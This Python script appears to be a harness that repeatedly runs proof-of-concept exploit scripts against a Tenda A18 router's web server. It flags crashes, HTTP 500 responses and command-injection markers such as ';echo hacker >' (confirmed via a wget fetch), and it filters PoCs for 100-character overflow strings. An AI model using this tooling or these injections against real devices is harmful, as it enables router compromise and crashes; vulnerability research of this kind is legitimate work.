import subprocess
import tempfile
from pathlib import Path
import time
import os
import re
import shutil
import platform
import sys
import requests

# while true; do /bin/httpd || echo "[!] httpd crashed at $(date)"; sleep 1; done
# for i in {1..200}; do python exec_poc.py; done

VENDOR        = "Tenda"
SERIES        = "A"
PRODUCT       = "A18"
RESULT_DIR    = "result"
POC_DIR       = Path(f"./{VENDOR}/{SERIES}/{PRODUCT}/POC")
POC_SUCCESS   = POC_DIR / "success"
BASE_DIR     = Path(f"./{VENDOR}/{SERIES}/{PRODUCT}")
PROGRESS_PATH = BASE_DIR / "progress.txt"
Verify_PROGRESS_PATH = POC_SUCCESS / "progress.txt"

def load_progress(PROGRESS_PATH):
    if PROGRESS_PATH.exists():
        try:
            return int(PROGRESS_PATH.read_text())
        except:
            return 0
    return 0

def save_progress(PROGRESS_PATH, index: int):
    PROGRESS_PATH.write_text(str(index))
    print(f"💾 已保存进度：下次从条目 {index} 开始")

def play_gugu():
    system = platform.system()

    if system == "Windows":
        # winsound 是标准库，无需额外安装
        import winsound
        # 播放系统默认提示音；如果想自定义频率+时长，用 winsound.Beep(freq, ms)
        winsound.MessageBeep(winsound.MB_ICONASTERISK)

    elif system == "Darwin":  # macOS
        # macOS 提供 AppleScript 的 beep 命令；次数可加在末尾（默认为 1）
        subprocess.run(["osascript", "-e", "beep"], check=True)

    else:                     # 大多数 Linux / *nix
        # 向终端写 ASCII Bell 字符 \a。前提：当前终端 / 系统启用了可听响铃
        sys.stdout.write("\a")
        sys.stdout.flush()


def wget_test():
    print("  🔍 检测到脚本中含有 '123.txt'，模拟 wget 请求 http://192.168.153.2/123.txt")
    try:
        wget_result = subprocess.run(
            ["wget", "-qO-", "http://192.168.153.2/123.txt"],
            capture_output=True,
            text=True
        )
        if wget_result.stdout.strip() == "hacker":
            print("  🌐 wget 响应内容：", wget_result.stdout.strip())
            return 1
        elif wget_result.stdout.strip() == "":
            print("  🌐 wget 响应内容为空")
            return 0

        return 0

    except requests.RequestException as e:
        print("  ❗ wget 请求失败：", str(e))
        return 0


def execute_pocs(mode, p_path, s_path, iterations):
    if mode == "exec":
        poc_files = sorted(POC_DIR.glob("*.py"))
    elif mode == "verify":
        poc_files = sorted(s_path.glob("*.py"))
    else:
        poc_files = sorted(POC_DIR.glob("*.py"))
    start_idx = load_progress(p_path)
    total = len(poc_files)
    print(f"▶️ 从第 {start_idx} 个 POC 开始测试，共 {total} 个文件。\n")
    time.sleep(5)
    for i, path in enumerate(poc_files[start_idx:], start=start_idx):
        print(f"🚀 执行 {path.name}")
        original_code = path.read_text(encoding="utf-8")

        with tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w", encoding="utf-8") as f:
            f.write(original_code)
            script_path = f.name

        try:
            for attempt in range(1, iterations+1):
                print(f"  🔁 第 {attempt}/{iterations} 次尝试")
                result = subprocess.run(["python", script_path], capture_output=True, text=True)
                output = result.stdout.strip() + result.stderr.strip()
                print("  Response:",output)

                if "EXCEPTION" in output:
                    print("  ❌ 捕获到 EXCEPTION，立即终止程序")
                    if mode == "exec":
                        shutil.copy(path, s_path / path.name)
                    save_progress(p_path, i + 1)
                    play_gugu()
                    raise RuntimeError(f"POC 执行异常终止：{path.name}\n输出信息：{output}")

                if "TIMEOUT" in output:
                    print("  ⚠ 捕获到 TIMEOUT")
                    time.sleep(5)

                elif "500" in output:
                    print("  ✅ 标记为成功（500），复制到 success 并中断本文件测试")
                    if mode == "exec":
                        shutil.copy(path, s_path / path.name)
                    break

                elif "200" in output:
                    time.sleep(3)

                flag = 0

                with open(script_path, 'r', encoding='utf-8') as f:
                    script_content = f.read()
                    if '123.txt' in script_content:
                        flag = wget_test()

                if flag == 1:
                    if mode == "exec":
                        shutil.copy(path, s_path / path.name)
                    modified_content = script_content.replace(';echo hacker >', ';rm')

                    # 创建临时脚本文件
                    with tempfile.NamedTemporaryFile('w', suffix='.py', delete=False) as tmp_file:
                        tmp_file_path = Path(tmp_file.name)
                        tmp_file.write(modified_content)

                    # 执行临时脚本
                    subprocess.run(["python", str(tmp_file_path)], capture_output=True, text=True)

                    # 删除临时脚本
                    tmp_file_path.unlink()

                    wget_test()
                    break

            save_progress(p_path, i + 1)

        finally:
            Path(script_path).unlink(missing_ok=True)

    print("\n✅ 所有 POC 测试完成。")


# 匹配基名末尾 "_数字"
BASENAME_RE = re.compile(r'^(?P<base>.+?)_\d+\.py$')
# 匹配参数名 A*100, 123.txt
PAYLOAD_RE = re.compile(
    r'["\'](?P<param>\w+)["\']\s*:\s*["\'](?:A{100,}|.*?123\.txt.*?)["\']'
)

def dedupe_payload_scripts(src_dir: str, dest_dir: str):
    """
    从指定目录中筛选包含连续100个A字符的payload的py文件，并根据文件基名和参数去重。
    去重后文件以“基名_参数.py”格式命名，保存到目标目录中。

    :param src_dir: 输入目录，包含待处理的py脚本
    :param dest_dir: 输出目录，保存去重后的脚本
    """
    def ensure_dest(path):
        if not os.path.exists(path):
            os.makedirs(path)

    def get_basename(filename):
        m = BASENAME_RE.match(filename)
        return m.group('base') if m else filename[:-3]  # 去掉 ".py"

    def extract_params(file_path):
        params = set()
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        for m in PAYLOAD_RE.finditer(content):
            params.add(m.group('param'))
        return params

    ensure_dest(dest_dir)

    seen = set()

    for fname in os.listdir(src_dir):
        if not fname.endswith('.py'):
            continue
        fullpath = os.path.join(src_dir, fname)

        base = get_basename(fname)
        params = extract_params(fullpath)
        if not params:
            continue

        for param in params:
            key = (base, param)
            if key in seen:
                continue
            seen.add(key)

            new_fname = f"{base}_{param}.py"
            dest_path = os.path.join(dest_dir, new_fname)
            print(f"Copying {fname} → {new_fname}")
            shutil.copy(fullpath, dest_path)

    print(f"\n共生成 {len(seen)} 个去重后脚本，保存在：{dest_dir}")


def main():
    POC_SUCCESS.mkdir(parents=True, exist_ok=True)
    execute_pocs("exec", PROGRESS_PATH, POC_SUCCESS, 7)
    execute_pocs("verify", Verify_PROGRESS_PATH, POC_SUCCESS, 5000)
    dedupe_payload_scripts(
        src_dir=f'{POC_SUCCESS}',
        dest_dir=f'{POC_SUCCESS}/unique'
    )


if __name__ == "__main__":
    main()
